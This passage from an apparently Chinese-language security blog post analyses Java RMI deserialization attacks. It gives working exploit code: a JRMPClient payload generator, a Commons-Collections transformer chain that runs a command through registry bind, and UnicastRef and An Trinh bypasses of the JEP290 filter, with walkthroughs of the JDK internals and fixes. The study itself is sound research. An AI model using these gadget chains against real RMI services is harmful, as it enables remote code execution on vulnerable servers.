<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> unicastref;<span class="comment">//JRMPClient</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Object o=getObject(<span class="string">&quot;localhost:1099&quot;</span>);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getObject</span> <span class="params">(<span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用exploit-JRMPListener-payload-JRMPClient服务端打客户端"><a href="#利用exploit-JRMPListener-payload-JRMPClient服务端打客户端" class="headerlink" title="利用exploit/JRMPListener+payload/JRMPClient服务端打客户端"></a>利用<code>exploit/JRMPListener</code>+<code>payload/JRMPClient</code>服务端打客户端</h3><p>然后我们开启<code>exploit/JRMPListener</code>，启动监听。这里好像不用动态代理也能打，如果有长度限制的话，可以考虑直接返回obj</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241120205351838.png" class="" title="image-20241120205351838">

<h1 id="0x03JEP290-绕过"><a href="#0x03JEP290-绕过" class="headerlink" title="0x03JEP290&amp;绕过"></a>0x03JEP290&amp;绕过</h1><h2 id="什么是JEP290"><a href="#什么是JEP290" class="headerlink" title="什么是JEP290"></a>什么是JEP290</h2><p>JEP290是Java底层为了缓解反序列化攻击提出的一种解决方案，主要提供了以下几个机制：</p>
<ul>
<li>提供一个限制反序列化类的机制，通过白名单或者黑名单的方式将可反序列化的类从任意类限制为上下文相关的类</li>
<li>限制反序列化的调用深度和复杂度</li>
<li>为RMI远程调用对象提供了一个验证类的机制</li>
<li>定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器</li>
</ul>
<p>JEP290是在jdk9之后加入的，不过在jdk6,7,8中的高版本也添加了这个机制：</p>
<ul>
<li>Java™ SE Development Kit 8, Update 121 (JDK 8u121)</li>
<li>Java™ SE Development Kit 7, Update 131 (JDK 7u131)</li>
<li>Java™ SE Development Kit 6, Update 141 (JDK 6u141)</li>
</ul>
<p>JEP290需要手动设置，只有设置了之后才会有过滤，如果没有设置的话，仍然可以进行正常的反序列化漏洞利用，设置JEP290的方式有下面两种：</p>
<ul>
<li>通过setObjectInputFilter来设置filter</li>
<li>直接通过conf&#x2F;security&#x2F;java.properties文件进行配置</li>
</ul>
<h2 id="JEP290简单分析"><a href="#JEP290简单分析" class="headerlink" title="JEP290简单分析"></a>JEP290简单分析</h2><p>当我们使用<code>JDK8u131</code>来测试server端通过bind恶意对象的方式，进行对registry端的攻击的时候，报出了如下错误</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap= LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        hashMap.remove(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass=LazyMap.class;</span><br><span class="line">        lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        Field factoryField=lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Registry registry=LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://localhost:1099/RemoteInterfaceImpl&quot;</span>,<span class="keyword">new</span> <span class="title class_">Wrapper</span>(expMap));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Wrapper</span> <span class="keyword">implements</span> <span class="title class_">Remote</span>, Serializable &#123;</span><br><span class="line">        <span class="keyword">private</span> Object obj;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Wrapper</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.obj=obj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241122180905307.png" class="" title="image-20241122180905307">

<p>可以看到是因为恶意的序列化数据没有通过filter导致的，我们从<code>RegistryImpl</code>这个类开始看起，在<code>RegistryImpl</code>的构造方法中</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241122191757192.png" class="" title="image-20241122191757192">

<p>再实例化<code>Unicast</code>的时候，传入了一个<code>RegistryImpl::registryFilter</code>，这是一个静态方法</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241122192019078.png" class="" title="image-20241122192019078">

<p><code>UnicastServerRef#filter</code>变量的声明如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">transient</span> ObjectInputFilter filter;</span><br></pre></td></tr></table></figure>

<p>这个<code>ObjectInputFilter</code>是一个函数式接口，有关ObjectInputFilter这一部分的具体实现可以参考<a target="_blank" rel="noopener" href="https://paper.seebug.org/1689/">漫谈 JEP 290 (seebug.org)</a>，我们直接看<code>Registry::registryFilter</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241122193315122.png" class="" title="image-20241122193315122">

<p>在288行，给出了白名单：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Number</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Remote</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Proxy</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">UnicastRef</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">RMIClientSocketFactory</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">RMIServerSocketFactory</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">ActivationID</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">UID</span>.class</span><br></pre></td></tr></table></figure>

<p>如果在这个白名单内，则返回<code>ALLOWED</code>，否则返回<code>REJECTED</code></p>
<p>当执行bind操作的时候，会调用<code>UnicastServerRef#oldDispatch</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241122195744597.png" class="" title="image-20241122195744597">

<p>再调用<code>RegistryImpl_Skel</code>之前，首先来到<code>unmarshalCustomCallData</code>，</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241122200541948.png" class="" title="image-20241122200541948">

<p>进入这个方法后，调用<code>Config.setObjectInputFilter</code>设置过滤，<code>UnicastServerRef.this.filter</code>就是我们在初始化<code>RegistryImpl</code>时设置的filter，防止白名单以外的类被反序列化所造成的反序列化攻击</p>
<h2 id="JEP290绕过"><a href="#JEP290绕过" class="headerlink" title="JEP290绕过"></a>JEP290绕过</h2><h3 id="UnicastRef-Bypass-JEP290-分析-jdk"><a href="#UnicastRef-Bypass-JEP290-分析-jdk" class="headerlink" title="UnicastRef Bypass JEP290 分析 (jdk&lt;&#x3D;8u231)"></a>UnicastRef Bypass JEP290 分析 (jdk&lt;&#x3D;8u231)</h3><p>我们通过<code>getRegistry</code>获取到的注册中心，实际上就是一个封装了<code>UnicastRef</code>对象的<code>RegistryImpl_Stub</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241123123558543.png" class="" title="image-20241123123558543">

<p>调用<code>bind</code>之后，会通过里面的<code>UnicastRef</code>来和注册中心进行通信，当我们传入要绑定的对象名和远程对象时，skel会对数据进行反序列化。所以整个JRMP通信的过程就是建立在<code>UnicastRef</code>对象上面</p>
<p>这意味着我们可以伪造一个<code>UnicastRef</code>对象来和注册中心创建通信，这里用到的链子还是<code>ysoserial/payloads/JRMPClient</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line"><span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line"><span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"><span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line"><span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">    Registry.class</span><br><span class="line">&#125;, obj);</span><br></pre></td></tr></table></figure>

<p>上面用到的类都在白名单内，自然不会被过滤了</p>
<p>client端代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Registry registry= LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        ObjID objID=<span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        TCPEndpoint tcpEndpoint=<span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;localhost&quot;</span>,<span class="number">2333</span>);</span><br><span class="line">        UnicastRef ref=<span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID,tcpEndpoint,<span class="literal">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler handler=<span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        Registry proxy= (Registry) Proxy.newProxyInstance(RMIClient.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Registry.class&#125;,handler);</span><br><span class="line">        registry.bind(<span class="string">&quot;test&quot;</span>,proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>server端代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        UserInterface userInterface=<span class="keyword">new</span> <span class="title class_">UserInterfaceImpl</span>();</span><br><span class="line">        Registry registry= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;rmi://localhost:1099/user&quot;</span>,userInterface);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个调用栈其实和前面说到的<code>UnicastRef</code>类的JRMP反序列化有些区别，这里再分析一下。当server端的skel通过<code>dispatch</code>方法处理<code>bind</code>的时候，会调用<code>readObject</code>，因为<code>RemoteObjectInvocationHandler</code>没有实现<code>Serializable</code>接口，所以会调用父类<code>RemoteObject</code>的<code>readObject</code>，进而调用<code>UnicastRef#readExternal()</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241123174714110.png" class="" title="image-20241123174714110">

<p>然后来到<code>LiveRef.read()</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241124180810392.png" class="" title="image-20241124180810392">

<p>然后在这里重新组装了一个<code>LiveRef</code>对象，这个对象和我们前面传入<code>UnicastRef</code>的那一个对象是一样的，然后接下来判断输入流in是不是一个<code>ConnectionInputStream</code>，这里会判断为true，然后来到<code>stream.saveRef</code>方法内</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241124182102779.png" class="" title="image-20241124182102779">



<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241124182233680.png" class="" title="image-20241124182233680">

<p>这里的<code>incomingRefTable</code>实际上是一个<code>HashMap</code>，ep和refList作为键值对填入其中，然后执行<code>refList.add()</code>把ref添加到<code>refList</code>中</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241125101152164.png" class="" title="image-20241125101152164">

<p>执行完上面这些，最终进入到<code>StreamRemoteCall#releaseInputStream</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241125101310365.png" class="" title="image-20241125101310365">

<p>然后调用<code>ConnectionInputStream#registerRefs</code>，遍历并且调用<code>DGCClient#registerRefs</code>解析前面存入<code>incomingRefTable</code>的<code>TCPEndpoint</code>和<code>LiveRef</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241125101520283.png" class="" title="image-20241125101520283">

<p>后面的调用栈就和<code>UnicastRef</code>反序列化那边是一样的了，所以最后也会来到<code>DGCImpl_Stub#dirty</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241123175832568.png" class="" title="image-20241123175832568">

<p>最终在<code>readObject</code>处触发反序列化</p>
<p>整个过程也没有调用<code>setObjectInputFilter</code>，所以也不存在白名单过滤，<code>exploit/JRMPListener</code>传入的恶意数据也能够被反序列化</p>
<img src="/2024/11/30/RMI反序列化/image-20241123181036721.png"  alt="image-20241123181036721" style="zoom: 50%;" />

<p>这里就引用<a target="_blank" rel="noopener" href="https://xz.aliyun.com/u/20851"><strong>啦啦0咯咯</strong></a> 师傅文章的原话，这条利用链的本质就是：</p>
<blockquote>
<ol>
<li><strong>readobject反序列化的过程会递归反序列化我们的对象，一直反序列化到我们的UnicastRef类。</strong></li>
<li><strong>在readobejct反序列化的过程中填装UnicastRef类到<code>incomingRefTable</code></strong></li>
<li><strong>在releaseInputStream语句中从incomingRefTable中读取ref进行开始JRMP请求</strong></li>
</ol>
</blockquote>
<h3 id="jdk8u231的修复"><a href="#jdk8u231的修复" class="headerlink" title="jdk8u231的修复"></a>jdk8u231的修复</h3><p>jdk8u231做出了两处修复：</p>
<ul>
<li><p>一处是在<code>DGCImpl_Stub#dirty()</code>方法处增加了<code>setObjectInputFilter</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241124111703735.png" class="" title="image-20241124111703735">
</li>
<li><p>另一处是在<code>RegistryImpl_Stub</code>处的<code>dispatch</code>方法添加了<code>discardPendingRefs()</code></p>
</li>
</ul>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241124171609255.png" class="" title="image-20241124171609255">

<p>如果序列化报错都会进入到这个方法，这个方法实际上就做了一件事——把前面的<code>incomingRefTable</code>清除</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241124171707679.png" class="" title="image-20241124171707679">

<p>前面说过，这个<code>incomingRefTable</code>就是保存<code>LiveRef</code>和<code>TCPEndPoint</code>对象的。这里把<code>incomingRefTable</code>清空掉的话就没办法触发反序列化漏洞了。</p>
<h3 id="Bypass-JEP290-jdk-8u231"><a href="#Bypass-JEP290-jdk-8u231" class="headerlink" title="Bypass JEP290(jdk&#x3D;8u231)"></a>Bypass JEP290(jdk&#x3D;8u231)</h3><p>国外安全研究员An Trinh提出了一种新的思路，ysomap和ysoserial里面也收集了这种打法，先贴上</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> UnicastRemoteObject <span class="title function_">pack</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//1.UnicastRef对象 -&gt; RemoteObjectInvocationHandler</span></span><br><span class="line">    <span class="comment">//obj是UnicastRef对象，先RemoteObjectInvocationHandler封装</span></span><br><span class="line">    <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>((RemoteRef) obj);</span><br><span class="line">    <span class="comment">//2. RemoteObjectInvocationHandler -&gt; RMIServerSocketFactory接口</span></span><br><span class="line">    <span class="comment">//RemoteObjectInvocationHandler通过动态代理封装转化成RMIServerSocketFactory</span></span><br><span class="line">    <span class="type">RMIServerSocketFactory</span> <span class="variable">serverSocketFactory</span> <span class="operator">=</span> (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">        RMIServerSocketFactory.class.getClassLoader(),<span class="comment">// classloader</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; RMIServerSocketFactory.class, Remote.class&#125;, <span class="comment">// interfaces to implements</span></span><br><span class="line">        handler<span class="comment">// RemoteObjectInvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">    <span class="comment">//通过反射机制破除构造方法的可见性性质，创建UnicastRemoteObject实例</span></span><br><span class="line">    Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="literal">null</span>); <span class="comment">// 获取默认的</span></span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">UnicastRemoteObject</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (UnicastRemoteObject) constructor.newInstance(<span class="literal">null</span>);</span><br><span class="line">    <span 